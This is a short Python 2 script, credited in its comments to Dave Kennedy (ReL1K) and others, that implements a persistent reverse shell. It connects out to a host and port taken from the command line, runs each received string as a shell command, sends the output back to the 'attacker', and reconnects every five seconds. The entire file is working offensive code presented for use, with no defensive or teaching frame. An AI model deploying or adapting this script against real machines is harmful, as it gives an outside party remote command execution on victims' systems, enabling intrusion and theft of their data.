#! /usr/bin/env python
#Simple Reverse Shell Written by: Dave Kennedy (ReL1K)
#Keep-alive mod by http://www.shellguardians.com/2011/07/simple-python-reverse-shell.html
#cli portability and win32 bin+packing by: cypherg


import socket
import subprocess
import sys
import time

HOST = str(sys.argv[1])  # The remote host
PORT = int(sys.argv[2])  # The same port as used by the server



def connect((host, port)):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, port))
	return s

def wait_for_command(s):
	data = s.recv(1024)
	if data == "quit\n":
		s.close()
		sys.exit(0)
	# the socket died
	elif len(data)==0:
		return True
	else:
		# do shell command
		proc = subprocess.Popen(data, shell=True,
			stdout=subprocess.PIPE, stderr=subprocess.PIPE,
			stdin=subprocess.PIPE)
		# read output
		stdout_value = proc.stdout.read() + proc.stderr.read()
		# send output to attacker
		s.send(stdout_value)
		return False

def main():
	while True:
		socked_died=False
		try:
			s=connect((HOST,PORT))
			while not socked_died:
				socked_died=wait_for_command(s)
			s.close()
		except socket.error:
			pass
		time.sleep(5)

if __name__ == "__main__":
	sys.exit(main())